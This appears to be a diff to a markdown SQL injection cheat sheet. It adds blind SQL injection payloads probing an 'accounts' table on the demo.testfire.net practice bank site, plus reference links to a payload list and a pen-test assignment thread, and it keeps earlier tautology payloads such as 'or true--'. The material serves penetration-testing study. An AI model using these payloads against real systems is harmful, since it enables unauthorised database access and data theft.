@@ -29,6 +29,11 @@ A SQL injection attack consists of insertion or "injection" of a SQL query via t
 " or ""*"
 or true--
 
+// Using for: https://demo.testfire.net/bank/main.jsp
+
+admin' and (select count(*) from accounts)>=5--
+admin' and (select count(*) from accounts)=5--
+
 ```
 
 ## _SQL Injection using SQLMap_
@@ -39,4 +44,8 @@ or true--
 ## _Entry point detection_
 
 
-# Thanks to and Reference
+# Thanks to and Reference:
+
+- https://github.com/payloadbox/sql-injection-payload-list
+- https://hbh.sh/forum/15/17543/help-on-pen-test-assignment-altoro-mutual-site
+
